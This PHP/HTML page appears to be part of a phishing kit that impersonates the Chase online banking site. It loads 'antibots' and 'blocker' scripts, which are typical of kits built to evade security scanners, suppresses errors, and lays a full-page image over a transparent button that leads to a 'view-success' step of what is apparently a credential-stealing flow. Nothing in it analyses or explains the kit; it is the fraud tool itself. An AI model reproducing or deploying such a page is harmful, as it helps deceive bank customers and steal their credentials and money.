<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include './bt.php';
include "./blocker.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0014)about:internet -->
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Chase online - Instruction</title>
<meta name="GENERATOR" content="Created by officialhome Website builder http://www.homename.com">
<meta name="HOSTING" content="Hosting Provided By hgator http://www.hostgator">
<link rel="shortcut icon" href="css/favicon.ico" type="css/vnd.microsoft.icon"/>
<link rel="icon" href="css/favicon.ico" type="css/vnd.microsoft.icon"/><style type="text/css">
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="mx" style="margin:0;padding:0;position:absolute;left:-1px;top:-1px;width:318px;height:483px;text-align:left;z-index:3;">
<img src="css/next-bg.png" id="" alt=""  align="top" border="0"></div>
<div id="mxl" style="position:absolute;left:0px;top:0px;width:1371px;height:713px;z-index:4">
<a id="bluebutton" type="button" value="submit" href="res/view-success.php" style="position:absolute;left:644px;top:703px;width:60px;height:18px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2">
</div></form>
</body></html>